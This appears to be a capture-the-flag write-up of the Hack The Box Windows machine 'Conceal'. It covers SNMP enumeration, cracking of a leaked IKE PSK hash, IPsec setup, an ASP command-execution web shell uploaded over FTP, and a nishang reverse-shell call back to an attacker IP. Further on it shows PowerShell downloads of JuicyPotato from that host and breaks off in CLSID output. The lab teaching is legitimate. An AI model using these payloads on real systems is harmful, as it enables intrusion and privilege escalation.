@@ -1,0 +1,886 @@
+---
+layout: default
+title: Conceal
+---
+
+<h1>Conceal</h1>
+<p class="date">18/05/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/conceal/conceal.png">
+
+<p>Conceal is a great Windows box, where to start we'll have to inspect a <code>snmp</code> server and configure <code>IKE/IPsec</code> to be able to see all the available ports in the machine. Then, to get user we'll have to create and upload a malicious <code>asp</code> file to execute powershell and get a shell on the system. Finally, to escalate privileges, we'll use the <code>JuicyPotato</code> exploit.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>If we try to run a simple <code>nmap</code> we'll see all ports seem to be filtered or closed.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# nmap -sC -sV 10.10.10.116 
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 11:54 UTC
+Nmap scan report for 10.10.10.116
+Host is up (0.057s latency).
+All 1000 scanned ports on 10.10.10.116 are filtered
+</pre>
+
+<p>Instead, we're going to run a full <code>masscan</code> to check all ports.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-04 11:58:59 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 161/udp on 10.10.10.116 
+</pre>
+
+<p>We can see only the port <code>161/udp</code> is open, so now we can use <code>nmap</code> to check what is running there.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# nmap -sV -sU -p161 10.10.10.116
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 12:13 UTC
+Nmap scan report for 10.10.10.116
+Host is up (0.058s latency).
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server (public)
+Service Info: Host: Conceal
+</pre>
+
+<p>We have <code>snmp</code> (<i>Simple Network Management Protocol</i>) in the machine. This protocol collects and organizes information about managed devices, so we'll run <code>snmp-check</code> to enumerate the information via <code>snmp</code>.</p>
+
+<pre class="prettyprint long">
+root@kali:~/htb/conceal# snmp-check 10.10.10.116
+snmp-check v1.9 - SNMP enumerator
+Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+
+[+] Try to connect to 10.10.10.116:161 using SNMPv1 and community 'public'
+
+[*] System information:
+
+  Host IP address               : 10.10.10.116
+  Hostname                      : Conceal
+  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
+  Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
+  Location                      : -
+  Uptime snmp                   : 13:58:55.20
+  Uptime system                 : 13:58:19.67
+  System date                   : 2019-3-4 12:04:54.5
+  Domain                        : WORKGROUP
+
+[*] User accounts:
+
+  Guest               
+  Destitute           
+  Administrator       
+  DefaultAccount      
+
+[*] Network information:
+
+  IP forwarding enabled         : no
+  Default TTL                   : 128
+  TCP segments received         : 249336
+  TCP segments sent             : 8
+  TCP segments retrans          : 4
+  Input datagrams               : 445397
+  Delivered datagrams           : 378229
+  Output datagrams              : 9284
+
+[*] Network interfaces:
+
+  Interface                     : [ up ] Software Loopback Interface 1
+  Id                            : 1
+  Mac Address                   : :::::
+  Type                          : softwareLoopback
+  Speed                         : 1073 Mbps
+  MTU                           : 1500
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ down ] WAN Miniport (IKEv2)
+  Id                            : 2
+  Mac Address                   : :::::
+  Type                          : unknown
+  Speed                         : 0 Mbps
+  MTU                           : 0
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ down ] WAN Miniport (PPTP)
+  Id                            : 3
+  Mac Address                   : :::::
+  Type                          : unknown
+  Speed                         : 0 Mbps
+  MTU                           : 0
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ down ] Microsoft Kernel Debug Network Adapter
+  Id                            : 4
+  Mac Address                   : :::::
+  Type                          : ethernet-csmacd
+  Speed                         : 0 Mbps
+  MTU                           : 0
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ down ] WAN Miniport (L2TP)
+  Id                            : 5
+  Mac Address                   : :::::
+  Type                          : unknown
+  Speed                         : 0 Mbps
+  MTU                           : 0
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ down ] Teredo Tunneling Pseudo-Interface
+  Id                            : 6
+  Mac Address                   : 00:00:00:00:00:00
+  Type                          : unknown
+  Speed                         : 0 Mbps
+  MTU                           : 0
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ down ] WAN Miniport (IP)
+  Id                            : 7
+  Mac Address                   : :::::
+  Type                          : ethernet-csmacd
+  Speed                         : 0 Mbps
+  MTU                           : 0
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ down ] WAN Miniport (SSTP)
+  Id                            : 8
+  Mac Address                   : :::::
+  Type                          : unknown
+  Speed                         : 0 Mbps
+  MTU                           : 0
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ down ] WAN Miniport (IPv6)
+  Id                            : 9
+  Mac Address                   : :::::
+  Type                          : ethernet-csmacd
+  Speed                         : 0 Mbps
+  MTU                           : 0
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection
+  Id                            : 10
+  Mac Address                   : 00:50:56:b9:8d:4c
+  Type                          : ethernet-csmacd
+  Speed                         : 1000 Mbps
+  MTU                           : 1500
+  In octets                     : 244445065
+  Out octets                    : 930466
+
+  Interface                     : [ down ] WAN Miniport (PPPOE)
+  Id                            : 11
+  Mac Address                   : :::::
+  Type                          : ppp
+  Speed                         : 0 Mbps
+  MTU                           : 0
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ down ] WAN Miniport (Network Monitor)
+  Id                            : 12
+  Mac Address                   : :::::
+  Type                          : ethernet-csmacd
+  Speed                         : 0 Mbps
+  MTU                           : 0
+  In octets                     : 0
+  Out octets                    : 0
+
+  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000
+  Id                            : 13
+  Mac Address                   : 00:50:56:b9:8d:4c
+  Type                          : ethernet-csmacd
+  Speed                         : 1000 Mbps
+  MTU                           : 1500
+  In octets                     : 244445065
+  Out octets                    : 930466
+
+  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000
+  Id                            : 14
+  Mac Address                   : 00:50:56:b9:8d:4c
+  Type                          : ethernet-csmacd
+  Speed                         : 1000 Mbps
+  MTU                           : 1500
+  In octets                     : 244445065
+  Out octets                    : 930466
+
+  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000
+  Id                            : 15
+  Mac Address                   : 00:50:56:b9:8d:4c
+  Type                          : ethernet-csmacd
+  Speed                         : 1000 Mbps
+  MTU                           : 1500
+  In octets                     : 244445065
+  Out octets                    : 930466
+
+
+[*] Network IP:
+
+  Id                    IP Address            Netmask               Broadcast           
+  10                    10.10.10.116          255.255.255.0         1                   
+  1                     127.0.0.1             255.0.0.0             1                   
+
+[*] Routing information:
+
+  Destination           Next hop              Mask                  Metric              
+  0.0.0.0               10.10.10.2            0.0.0.0               281                 
+  10.10.10.0            10.10.10.116          255.255.255.0         281                 
+  10.10.10.116          10.10.10.116          255.255.255.255       281                 
+  10.10.10.255          10.10.10.116          255.255.255.255       281                 
+  127.0.0.0             127.0.0.1             255.0.0.0             331                 
+  127.0.0.1             127.0.0.1             255.255.255.255       331                 
+  127.255.255.255       127.0.0.1             255.255.255.255       331                 
+  224.0.0.0             127.0.0.1             240.0.0.0             331                 
+  255.255.255.255       127.0.0.1             255.255.255.255       331                 
+
+[*] TCP connections and listening ports:
+
+  Local address         Local port            Remote address        Remote port           State               
+  0.0.0.0               21                    0.0.0.0               0                     listen              
+  0.0.0.0               80                    0.0.0.0               0                     listen              
+  0.0.0.0               135                   0.0.0.0               0                     listen              
+  0.0.0.0               445                   0.0.0.0               0                     listen              
+  0.0.0.0               49664                 0.0.0.0               0                     listen              
+  0.0.0.0               49665                 0.0.0.0               0                     listen              
+  0.0.0.0               49666                 0.0.0.0               0                     listen              
+  0.0.0.0               49667                 0.0.0.0               0                     listen              
+  0.0.0.0               49668                 0.0.0.0               0                     listen              
+  0.0.0.0               49669                 0.0.0.0               0                     listen              
+  0.0.0.0               49670                 0.0.0.0               0                     listen              
+  10.10.10.116          139                   0.0.0.0               0                     listen              
+
+[*] Listening UDP ports:
+
+  Local address         Local port          
+  0.0.0.0               123                 
+  0.0.0.0               161                 
+  0.0.0.0               500                 
+  0.0.0.0               4500                
+  0.0.0.0               5050                
+  0.0.0.0               5353                
+  0.0.0.0               5355                
+  0.0.0.0               56854               
+  10.10.10.116          137                 
+  10.10.10.116          138                 
+  10.10.10.116          1900                
+  10.10.10.116          64308               
+  127.0.0.1             1900                
+  127.0.0.1             64309               
+
+[*] Network services:
+
+  Index                 Name                
+  0                     Power               
+  1                     Server              
+  2                     Themes              
+  3                     IP Helper           
+  4                     DNS Client          
+  5                     Data Usage          
+  6                     Superfetch          
+  7                     DHCP Client         
+  8                     Time Broker         
+  9                     TokenBroker         
+  10                    Workstation         
+  11                    SNMP Service        
+  12                    User Manager        
+  13                    VMware Tools        
+  14                    Windows Time        
+  15                    CoreMessaging       
+  16                    Plug and Play       
+  17                    Print Spooler       
+  18                    Windows Audio       
+  19                    SSDP Discovery      
+  20                    Task Scheduler      
+  21                    Windows Search      
+  22                    Security Center     
+  23                    Storage Service     
+  24                    Windows Firewall    
+  25                    CNG Key Isolation   
+  26                    COM+ Event System   
+  27                    Windows Event Log   
+  28                    IPsec Policy Agent  
+  29                    Geolocation Service 
+  30                    Group Policy Client 
+  31                    RPC Endpoint Mapper 
+  32                    Data Sharing Service
+  33                    Device Setup Manager
+  34                    Network List Service
+  35                    System Events Broker
+  36                    User Profile Service
+  37                    Base Filtering Engine
+  38                    Local Session Manager
+  39                    Microsoft FTP Service
+  40                    TCP/IP NetBIOS Helper
+  41                    Cryptographic Services
+  42                    Tile Data model server
+  43                    COM+ System Application
+  44                    Diagnostic Service Host
+  45                    Shell Hardware Detection
+  46                    State Repository Service
+  47                    Diagnostic Policy Service
+  48                    Network Connection Broker
+  49                    Security Accounts Manager
+  50                    Network Location Awareness
+  51                    Windows Connection Manager
+  52                    Windows Font Cache Service
+  53                    Remote Procedure Call (RPC)
+  54                    DCOM Server Process Launcher
+  55                    Windows Audio Endpoint Builder
+  56                    Application Host Helper Service
+  57                    Network Store Interface Service
+  58                    Client License Service (ClipSVC)
+  59                    Distributed Link Tracking Client
+  60                    System Event Notification Service
+  61                    World Wide Web Publishing Service
+  62                    Connected Devices Platform Service
+  63                    Windows Defender Antivirus Service
+  64                    Windows Management Instrumentation
+  65                    Windows Process Activation Service
+  66                    Distributed Transaction Coordinator
+  67                    IKE and AuthIP IPsec Keying Modules
+  68                    Microsoft Account Sign-in Assistant
+  69                    VMware CAF Management Agent Service
+  70                    VMware Physical Disk Helper Service
+  71                    Background Intelligent Transfer Service
+  72                    Background Tasks Infrastructure Service
+  73                    Program Compatibility Assistant Service
+  74                    VMware Alias Manager and Ticket Service
+  75                    Connected User Experiences and Telemetry
+  76                    WinHTTP Web Proxy Auto-Discovery Service
+  77                    Windows Defender Security Centre Service
+  78                    Windows Push Notifications System Service
+  79                    Windows Defender Antivirus Network Inspection Service
+  80                    Windows Driver Foundation - User-mode Driver Framework
+
+[*] Processes:
+
+  Id                    Status                Name                  Path                  Parameters          
+  1                     running               System Idle Process                                             
+  4                     running               System                                                          
+  280                   running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetwork
+  312                   running               smss.exe                                                        
+  352                   running               svchost.exe           C:\Windows\System32\  -k LocalSystemNetworkRestricted
+  396                   running               csrss.exe                                                       
+  476                   running               wininit.exe                                                     
+  496                   running               csrss.exe                                                       
+  576                   running               winlogon.exe                                                    
+  600                   running               services.exe                                                    
+  628                   running               lsass.exe             C:\Windows\system32\                      
+  708                   running               fontdrvhost.exe                                                 
+  716                   running               fontdrvhost.exe                                                 
+  724                   running               svchost.exe           C:\Windows\system32\  -k DcomLaunch       
+  824                   running               svchost.exe           C:\Windows\system32\  -k RPCSS            
+  840                   running               svchost.exe           C:\Windows\system32\  -k LocalService     
+  928                   running               dwm.exe                                                         
+  944                   running               svchost.exe           C:\Windows\system32\  -k netsvcs          
+  1000                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
+  1052                  running               svchost.exe           C:\Windows\System32\  -k NetworkService   
+  1116                  running               vmacthlp.exe          C:\Program Files\VMware\VMware Tools\                      
+  1200                  running               SearchProtocolHost.exe  C:\Windows\system32\  Global\UsGthrFltPipeMssGthrPipe166_ Global\UsGthrCtrlFltPipeMssGthrPipe166 1 -2147483646 "Software\Microsoft\Windows Search" "M
+  1288                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
+  1348                  running               Memory Compression                                              
+  1356                  running               dllhost.exe           C:\Windows\system32\  /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
+  1400                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
+  1408                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNetworkRestricted
+  1520                  running               spoolsv.exe           C:\Windows\System32\                      
+  1772                  running               svchost.exe           C:\Windows\system32\  -k apphost          
+  1792                  running               svchost.exe           C:\Windows\System32\  -k utcsvc           
+  1808                  running               svchost.exe           C:\Windows\system32\  -k ftpsvc           
+  1852                  running               SearchFilterHost.exe  C:\Windows\system32\  0 692 696 704 8192 700
+  1876                  running               SecurityHealthService.exe                                            
+  1900                  running               snmp.exe              C:\Windows\System32\                      
+  1916                  running               svchost.exe           C:\Windows\system32\  -k iissvcs          
+  1924                  running               vmtoolsd.exe          C:\Program Files\VMware\VMware Tools\                      
+  1932                  running               VGAuthService.exe     C:\Program Files\VMware\VMware Tools\VMware VGAuth\                      
+  1940                  running               ManagementAgentHost.exe  C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\                      
+  1952                  running               MsMpEng.exe                                                     
+  1980                  running               LogonUI.exe                                 /flags:0x0 /state0:0xa39d1055 /state1:0x41c64e6d
+  2576                  running               svchost.exe           C:\Windows\system32\  -k NetworkServiceNetworkRestricted
+  2728                  running               SearchIndexer.exe     C:\Windows\system32\  /Embedding          
+  3012                  running               WmiPrvSE.exe          C:\Windows\system32\wbem\                      
+  3184                  running               NisSrv.exe                                                      
+  3356                  running               msdtc.exe             C:\Windows\System32\                      
+  3692                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceAndNoImpersonation
+  3748                  running               svchost.exe                                                     
+  3844                  running               svchost.exe           C:\Windows\system32\  -k appmodel         
+  4068                  running               svchost.exe           C:\Windows\system32\  -k LocalSystemNetworkRestricted
+
+[*] Storage information:
+
+  Description                   : ["C:\\ Label:  Serial Number 9606be7b"]
+  Device id                     : [#&lt;SNMP::Integer:0x0000563458c29c90 @value=1>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#&lt;SNMP::Integer:0x0000563458c27df0 @value=4096>]
+  Memory size                   : 59.51 GB
+  Memory used                   : 10.85 GB
+
+  Description                   : ["D:\\"]
+  Device id                     : [#&lt;SNMP::Integer:0x0000563458c1a6a0 @value=2>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#&lt;SNMP::Integer:0x0000563458c18990 @value=0>]
+  Memory size                   : 0 bytes
+  Memory used                   : 0 bytes
+
+  Description                   : ["Virtual Memory"]
+  Device id                     : [#&lt;SNMP::Integer:0x0000563458bfb2f0 @value=3>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#&lt;SNMP::Integer:0x0000563458bf9518 @value=65536>]
+  Memory size                   : 3.12 GB
+  Memory used                   : 794.69 MB
+
+  Description                   : ["Physical Memory"]
+  Device id                     : [#&lt;SNMP::Integer:0x0000563458be7ea8 @value=4>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#&lt;SNMP::Integer:0x0000563458be60f8 @value=65536>]
+  Memory size                   : 2.00 GB
+  Memory used                   : 703.06 MB
+
+
+[*] File system information:
+
+  Index                         : 1
+  Mount point                   : 
+  Remote mount point            : -
+  Access                        : 1
+  Bootable                      : 0
+
+[*] Device information:
+
+  Id                    Type                  Status                Descr               
+  1                     unknown               running               Microsoft XPS Document Writer v4
+  2                     unknown               running               Microsoft Print To PDF
+  3                     unknown               running               Microsoft Shared Fax Driver
+  4                     unknown               running               Unknown Processor Type
+  5                     unknown               running               Unknown Processor Type
+  6                     unknown               unknown               Software Loopback Interface 1
+  7                     unknown               unknown               WAN Miniport (IKEv2)
+  8                     unknown               unknown               WAN Miniport (PPTP) 
+  9                     unknown               unknown               Microsoft Kernel Debug Network Adapter
+  10                    unknown               unknown               WAN Miniport (L2TP) 
+  11                    unknown               unknown               Teredo Tunneling Pseudo-Interface
+  12                    unknown               unknown               WAN Miniport (IP)   
+  13                    unknown               unknown               WAN Miniport (SSTP) 
+  14                    unknown               unknown               WAN Miniport (IPv6) 
+  15                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection
+  16                    unknown               unknown               WAN Miniport (PPPOE)
+  17                    unknown               unknown               WAN Miniport (Network Monitor)
+  18                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer
+  19                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-
+  20                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer L
+  21                    unknown               unknown               D:\                 
+  22                    unknown               running               Fixed Disk          
+  23                    unknown               running               IBM enhanced (101- or 102-key) keyboard, Subtype=(0)
+
+[*] Software components:
+
+  Index                 Name                
+  1                     Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161
+  2                     VMware Tools        
+  3                     Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161
+
+[*] IIS server information:
+
+  TotalBytesSentLowWord         : 0
+  TotalBytesReceivedLowWord     : 0
+  TotalFilesSent                : 0
+  CurrentAnonymousUsers         : 0
+  CurrentNonAnonymousUsers      : 0
+  TotalAnonymousUsers           : 0
+  TotalNonAnonymousUsers        : 0
+  MaxAnonymousUsers             : 0
+  MaxNonAnonymousUsers          : 0
+  CurrentConnections            : 0
+  MaxConnections                : 0
+  ConnectionAttempts            : 0
+  LogonAttempts                 : 0
+  Gets                          : 0
+  Posts                         : 0
+  Heads                         : 0
+  Others                        : 0
+  CGIRequests                   : 0
+  BGIRequests                   : 0
+  NotFoundErrors                : 0
+</pre>
+
+<p>In the output we have a lot of interesting information, such as users, services running and devices, but what we'll focus on is the system contact field (<code>IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43</code>).</p>
+
+<p><code>IKE</code> (<i>Internet Key Exchange</i>) is the protocol used to set up a security association (<i>SA</i>) in the <code>IPsec</code> protocol suite.</p>
+
+<p>We have the hashed Pre-Shared Key (<code>PSK</code>), so we'll use <code>hashcat</code> to retrieve the password.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# hashcat -m 1000 -a 0 pass /usr/share/wordlists/rockyou.txt --force
+hashcat (v5.1.0) starting...
+9c8b1a372b1878851be2c097031b6e43:Dudecake1!
+</pre>
+
+<p>Now we need to find the connection configuration, so we'll use <code>ike-scan</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# ike-scan 10.10.10.116
+Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.10.116	Main Mode Handshake returned HDR=(CKY-R=cc81ff8b4dbf4806) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080) VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8) VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T) VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n) VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation) VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable) VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)
+</pre>
+
+<p>With this output we can confirm the <code>IKE</code> uses:</p>
+<ul>
+	<li>IKE version 1</li>
+	<li>Encryption Algorithm: 3DES</li>
+	<li>Integrity Algorithm: SHA1</li>
+	<li>Diffie Hellman Group: modp1024</li>
+</ul>
+
+<p>To connect through <code>IPsec</code> we'll use <a href="https://www.strongswan.org/" target="_blank">strongswan</a> and to apply the configuration we'll use <a href="https://wiki.strongswan.org/projects/strongswan/wiki/connsection" target="_blank">this guide</a> to create the following connection in the configuration file <code>/etc/ipsec.conf</code>.</p>
+
+<pre class="prettyprint">
+conn conceal
+	authby=psk
+	auto=start
+	esp=3des-sha1
+	ike=3des-sha1-modp1024
+	keyexchange=ikev1
+	type=transport
+	right=10.10.10.116
+	rightsubnet=10.10.10.116[tcp/]
+</pre>
+
+<p>We also have to add the password we found before in <code>/etc/ipsec.secrets</code>.</p>
+
+<pre class="prettyprint">
+10.10.10.116 : PSK "Dudecake1!"
+</pre>
+
+<p>Now we start the <code>ipsec</code> service and if we check the status we should see something like this.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# ipsec start
+Starting strongSwan 5.7.2 IPsec [starter]...
+root@kali:~/htb/conceal# ipsec status
+Security Associations (1 up, 0 connecting):
+     conceal[1]: ESTABLISHED 1 second ago, 10.10.16.38[10.10.16.38]...10.10.10.116[10.10.10.116]
+     conceal{1}:  INSTALLED, TRANSPORT, reqid 1, ESP SPIs: c99933cf_i c3024e80_o
+     conceal{1}:   10.10.16.38/32 === 10.10.10.116/32[tcp]
+</pre>
+
+<p>In the <code>snmp-check</code> output we saw we had services running in ports: <code>21 80 135 445 49664 49665 49666 49667 49668 49669 49670 139</code>.</p>
+
+<p>We'll start inspecting what's running on port <code>21</code>, probably an <code>ftp</code>.</p>
+
+<p>Indeed, we have an <code>ftp</code> server and we can login as an anonymous user but there's nothing there.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# ftp 10.10.10.116
+Connected to 10.10.10.116.
+220 Microsoft FTP Service
+Name (10.10.10.116:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+</pre>
+
+<p>But we can upload files, so it could be helpful later.</p>
+
+<pre class="prettyprint">
+ftp> put caca
+local: caca remote: caca
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+6 bytes sent in 0.00 secs (117.1875 kB/s)
+</pre>
+
+<p>Let's move to port <code>80</code> where we seem to have an <code>IIS</code> running.</p>
+
+<img class="img-fluid" src="/static/img/htb/conceal/1.png">
+
+<p>If we run <code>gobuster</code> we should see a directory <code>/upload</code> is available.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# /opt/gobuster/gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.116/
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.116/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/03/04 16:32:03 Starting gobuster
+=====================================================
+/upload (Status: 301)
+=====================================================
+2019/03/04 16:33:40 Finished
+=====================================================
+</pre>
+
+<p>There we have a directory listing with the file we uploaded to the <code>ftp</code> server.</p>
+
+<img class="img-fluid" src="/static/img/htb/conceal/2.png">
+
+<p>If we visit a page that doesn't exist we get the following error page.</p>
+
+<img class="img-fluid" src="/static/img/htb/conceal/3.png">
+
+<p>Here we can see the path where the files are being stored <code>C:\inetpub\wwwroot\upload\dasds</code>.</p>
+
+<p>I tried to create malicious <code>asp</code> files via <code>msfvenom</code> but didn't work for me, so I finally did my own custom <code>asp</code> file which executes commands in the machine, stores the output in a file and then prints the content of that file in the page.</p> 
+
+<pre class="prettyprint">
+<%
+Set oWSH = Server.CreateObject("WScript.Shell")
+Call oWSH.Run ("cmd.exe /c dir > C:\inetpub\wwwroot\upload\caca", 0, True)
+
+Set fso  = CreateObject("Scripting.FileSystemObject")
+Set file = fso.OpenTextFile("C:\inetpub\wwwroot\upload\caca", 1)
+text = file.ReadAll
+file.Close
+%>
+<%= text %>
+</pre>
+
+<p>Upload it via <code>ftp</code>.</p>
+
+<pre class="prettyprint">
+ftp> put shell.asp
+</pre>
+
+<p>And if we access to <code>http://10.10.10.116/upload/shell.asp</code> we see the output of the <code>dir</code> command.</p>
+
+<img class="img-fluid" src="/static/img/htb/conceal/4.png">
+
+<p>Now to retrieve a shell, we'll use <a href="https://github.com/samratashok/nishang" target="_blank">nishang</a> <code>Invoke-PowerShellTcp.ps1</code> script adding the following line at the end to execute it.</p>
+
+<pre class="prettyprint">
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.38 -Port 6969
+</pre>
+
+<p>Modify the <code>asp</code> file to execute our <code>PS</code> script.</p>
+
+<pre class="prettyprint">
+<%
+Set oWSH = Server.CreateObject("WScript.Shell")
+Call oWSH.Run ("cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\inetpub\wwwroot\upload\Invoke-PowerShellTcp.ps1", 0, True)
+%>
+</pre>
+
+<p>Upload the <code>PS</code> script and the <code>asp</code> file via <code>ftp</code>.</p>
+
+<pre class="prettyprint">
+ftp> put shell.asp
+ftp> put Invoke-PowerShellTcp.ps1
+</pre>
+
+<p>Now if we access to <code>http://10.10.10.116/upload/shell.asp</code> and listen on the specified port we should get a PowerShell shell as <code>conceal</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/conceal# nc -nlvp 6969
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.116.
+Ncat: Connection from 10.10.10.116:49675.
+Windows PowerShell running as user CONCEAL$ on CONCEAL
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\SysWOW64\inetsrv>
+</pre>
+
+<p>In <code>Destitute</code>'s desktop we have the user flag.</p>
+
+<pre class="prettyprint">
+PS C:\Users\Destitute\Desktop> type proof.txt
+<span flag="6E9FDFE0DCB66E700FB9CB824AE5A6FF">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>If we check user privileges we can see <code>SeImpersonatePrivilege</code> is enabled.</p>
+
+<pre class="prettyprint">
+PS C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+</pre>
+
+<p>With this privilege enabled we should be able to escalate privileges via <a href="https://github.com/breenmachine/RottenPotatoNG" target="_blank">RottenPotato</a> but I tried and I didn't make it work, so I used <a href="https://github.com/ohpe/juicy-potato" target="_blank">Juicy Potato</a> which allows to change the COM server to abuse (default is <code>BITS</code>).</p>
+
+<p>First, we need to find a valid <code>CLSID</code> for this machine, so download the list of <code>CLSID</code> for Windows 10 Enterprise, the <code>bat</code> file and the <code>exe</code> from github and move them to Conceal.</p>
+
+<pre class="prettyprint">
+PS C:\Users\Public> (New-Object System.Net.WebClient).DownloadFile("http://10.10.16.38/CLSID.list","C:\Users\Public\CLSID.list")
+PS C:\Users\Public> (New-Object System.Net.WebClient).DownloadFile("http://10.10.16.38/test_clsid.bat","C:\Users\Public\test_clsid.bat")
+PS C:\Users\Public> (New-Object System.Net.WebClient).DownloadFile("http://10.10.16.38/JuicyPotato.exe","C:\Users\Public\JuicyPotato.exe")
+</pre>
+
+<p>Now execute the <code>bat</code> which will check which <code>CLSID</code> are valid for this machine.</p>
+
+<pre class="prettyprint">
+PS C:\Users\Public> C:\Users\Public\test_clsid.bat
+</pre>
+
+<p>After a couple of minutes we should have the output in <code>result.log</code>. Here we have to pick one that runs as <code>NT AUTHORITY\SYSTEM</code>.</p> 
+
+<pre class="prettyprint long">
+PS C:\Users\Public> type result.log                   
+{0289a7c5-91bf-4547-81ae-fec91a89dec5};CONCEAL\Destitute
+{98068995-54d2-4136-9bc9-6dbcb0a4683f};CONCEAL\Destitute
+{9acf41ed-d457-4cc1-941b-ab02c26e4686};CONCEAL\Destitute
+{9678f47f-2435-475c-b24a-4606f8161c16};CONCEAL\Destitute
+{417976B7-917D-4F1E-8F14-C18FCCB0B3A8};CONCEAL\Destitute
+{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8};NT AUTHORITY\SYSTEM
